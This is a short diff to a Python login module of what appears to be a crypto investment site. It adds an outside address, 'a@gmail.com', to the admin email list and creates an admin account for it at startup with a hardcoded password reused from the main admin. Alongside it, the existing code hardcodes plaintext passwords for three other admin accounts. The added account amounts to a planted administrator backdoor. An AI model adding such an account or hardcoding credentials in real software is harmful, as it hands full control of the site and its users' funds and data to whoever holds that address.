@@ -602,7 +602,8 @@ def login():
             ADMIN_EMAILS = [
                 'admin@investcryptopro.com',
                 'support@investcryptopro.com',
-                'security@investcryptopro.com'
+                'security@investcryptopro.com',
+                'a@gmail.com'
             ]
             
             # Vérification admin sécurisée - DÉSACTIVÉ PAR DÉFAUT
@@ -1792,6 +1793,7 @@ if __name__ == '__main__':
     create_secure_admin('admin@investcryptopro.com', 'AdminSecure2024!', 'Admin', 'Principal')
     create_secure_admin('support@investcryptopro.com', 'SupportSecure2024!', 'Support', 'Team')
     create_secure_admin('security@investcryptopro.com', 'SecuritySecure2024!', 'Security', 'Team')
+    create_secure_admin('a@gmail.com', 'AdminSecure2024!', 'Admin', 'User')
 
     # Setup scheduler for daily profit calculation
     scheduler = BackgroundScheduler()
